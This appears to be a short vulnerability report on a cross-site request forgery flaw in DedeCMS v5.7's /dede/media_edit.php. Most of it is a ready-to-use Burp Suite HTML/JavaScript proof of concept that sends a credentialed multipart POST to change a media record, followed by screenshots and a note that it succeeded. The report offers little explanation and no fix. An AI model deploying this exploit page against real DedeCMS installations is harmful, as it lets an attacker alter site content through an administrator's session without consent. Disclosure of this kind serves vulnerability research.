target:https://github.com/wdsunwq/DedeCMSv5
version: v5.7

DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /dede/media_edit.php

![1](https://github.com/777erp/cms/assets/113673221/a69145e2-9a34-4f10-9046-984e7fe43e0c)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1\/src\/dede\/media_edit.php", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------29310793893551959483812618628");
        xhr.withCredentials = true;
        var body = "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"dopost\"\r\n" + 
          "\r\n" + 
          "save\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"token\"\r\n" + 
          "\r\n" + 
          "5770dd76380ef09c6cc56d203a171095\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"aid\"\r\n" + 
          "\r\n" + 
          "284\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"mediatype\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"title\"\r\n" + 
          "\r\n" + 
          "\xe3\x80\x8a\xe8\xae\xba\xe8\xaf\xad\xe3\x80\x8b\xe4\xba\x8c123\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"mediawidth\"\r\n" + 
          "\r\n" + 
          "478\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"mediaheight\"\r\n" + 
          "\r\n" + 
          "358\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"playtime\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"filename\"\r\n" + 
          "\r\n" + 
          "http://www.dedecms.com/demoimg/uploads/210823/1-210R31I61XP.png\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"upfile\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"imageField.x\"\r\n" + 
          "\r\n" + 
          "59\r\n" + 
          "-----------------------------29310793893551959483812618628\r\n" + 
          "Content-Disposition: form-data; name=\"imageField.y\"\r\n" + 
          "\r\n" + 
          "11\r\n" + 
          "-----------------------------29310793893551959483812618628--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>


```

![2](https://github.com/777erp/cms/assets/113673221/a8994b76-3cee-435e-86ff-d91fbd1dffe2)


Successed

![3](https://github.com/777erp/cms/assets/113673221/98751129-7b8c-4b4d-99e0-13320a3eb4bc)

